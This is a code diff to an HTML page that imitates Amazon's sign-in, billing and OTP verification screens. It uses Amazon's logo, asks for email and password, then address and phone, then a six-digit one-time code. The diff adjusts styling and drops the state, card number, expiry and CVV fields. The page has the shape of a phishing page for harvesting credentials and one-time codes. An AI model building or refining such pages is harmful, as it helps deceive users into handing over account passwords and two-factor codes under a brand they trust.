@@ -21,10 +21,14 @@
             background-color: #fff;
             border: 1px solid #ddd;
             padding: 20px;
-            width: 100%;
-            max-width: 400px;
+            width: 90%;
+            max-width: 350px;
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            height: 90vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
 
         .amazon-logo {
@@ -34,7 +38,7 @@
         }
 
         h1 {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
             margin-bottom: 15px;
             color: #333;
@@ -43,17 +47,17 @@
 
         label {
             display: block;
-            font-size: 12px;
+            font-size: 14px;
             margin-bottom: 5px;
             color: #555;
         }
 
         input {
             width: 100%;
-            padding: 8px;
+            padding: 10px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
-            border-radius: 20px;
+            border-radius: 10px;
         }
 
         button {
@@ -62,7 +66,7 @@
             background-color: #ffa41c;
             border: none;
             color: #fff;
-            font-size: 14px;
+            font-size: 16px;
             border-radius: 20px;
             cursor: pointer;
         }
@@ -72,19 +76,10 @@
         }
 
         .footer {
-            font-size: 11px;
+            font-size: 12px;
             color: #555;
             margin-top: 10px;
             text-align: center;
-        }
-
-        .footer a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
         }
 
         .hidden {
@@ -93,22 +88,17 @@
 
         .otp-bar {
             display: flex;
-            justify-content: center;
-            gap: 6px;
+            justify-content: space-between;
+            gap: 5px;
         }
 
         .otp-bar input {
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             text-align: center;
-            font-size: 18px;
+            font-size: 16px;
             border: 1px solid #ccc;
-            border-radius: 20px;
-        }
-
-        .otp-bar input:focus {
-            border-color: #ffa41c;
-            outline: none;
+            border-radius: 10px;
         }
     </style>
     <script>
@@ -139,10 +129,8 @@
             <form onsubmit="event.preventDefault(); goToBillingAndPayment();">
                 <label for="email">Email or mobile phone number</label>
                 <input type="email" id="email" name="email" required>
-
                 <label for="password">Password</label>
                 <input type="password" id="password" name="password" required>
-
                 <button type="submit">Sign-In</button>
             </form>
             <div class="footer">
@@ -157,37 +145,20 @@
             <form onsubmit="event.preventDefault(); goToOTP();">
                 <label for="address">Address</label>
                 <input type="text" id="address" name="address" required>
-
                 <label for="city">City</label>
                 <input type="text" id="city" name="city" required>
-
-                <label for="state">State</label>
-                <input type="text" id="state" name="state" required>
-
                 <label for="zip">Zip Code</label>
                 <input type="text" id="zip" name="zip" required>
-
                 <label for="phone">Phone Number</label>
                 <input type="text" id="phone" name="phone" required>
-
-                <label for="card">Credit/Debit Card Number</label>
-                <input type="text" id="card" name="card" required>
-
-                <label for="expiry">Expiry Date</label>
-                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
-
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" name="cvv" required>
-
                 <button type="submit">Next</button>
             </form>
         </div>
 
-        <!-- OTP Verification Page -->
+        <!-- OTP Page -->
         <div id="otp-page" class="page hidden">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="amazon-logo">
             <h1>OTP Verification</h1>
-            <p>We have sent a 6-digit OTP to your registered email/phone number. Please enter it below:</p>
             <form onsubmit="event.preventDefault(); confirmOrder();">
                 <div class="otp-bar">
                     <input type="text" maxlength="1" required>
